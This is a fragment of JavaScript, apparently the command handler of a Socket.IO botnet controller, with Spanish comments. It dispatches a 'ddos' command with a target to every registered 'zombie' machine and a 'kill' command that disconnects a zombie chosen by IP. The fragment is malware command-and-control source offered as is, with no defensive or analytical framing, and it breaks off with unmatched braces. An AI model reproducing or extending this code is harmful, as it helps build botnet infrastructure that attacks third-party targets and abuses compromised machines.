switch(data.command) {
case 'ddos':
// Enviar comando DDoS a todos los zombies registrados
zombies.forEach(zombie => {
io.to(zombie.id).emit('ddos', data.target);
});
break;
case 'kill':
// Eliminar un zombie específico de la lista y desconectarlo
let targetZombie = zombies.find(zombie => zombie.ip === data.target_ip);  if (targetZombie) {      io.to(targetZombie.id).disconnect(true);    zombies = zombies.filter(zombie => zombie.id !== targetZombie.id);
}  break;
default:
console.log('Comando desconocido: ' + data.command);
}


});